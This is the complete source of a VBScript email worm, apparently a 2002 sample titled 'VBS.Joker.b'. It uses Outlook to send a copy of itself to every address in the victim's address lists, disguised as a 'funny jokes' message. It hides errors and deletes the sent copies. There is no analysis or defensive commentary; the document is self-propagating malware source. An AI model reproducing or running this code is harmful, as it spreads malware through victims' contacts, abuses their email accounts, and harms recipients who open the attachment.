'VBS.Joker.b by Negral (c)2002
On Error Resume Next
dim x,a,ctrE,maleAd,ctrL,joke
joke = "Check out these funny jokes! :)"
set ol=WScript.CreateObject("Outlook.Application")
set mapi=ol.GetNameSpace("MAPI")
for ctrL=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrL)
for ctrE=1 to a.AddressEntries.Count
maleAd=a.AddressEntries(x)
set mail=ol.CreateItem(0)
mail.Recipients.Add(maleAd)
mail.Subject = joke
mail.Body = joke
mail.Attachments.Add WScript.ScriptFullName
mail.Send
mail.DeleteAfterSubmit = True
x=x+1
next
Set mapi=Nothing
Set mail=Nothing
ol.Quit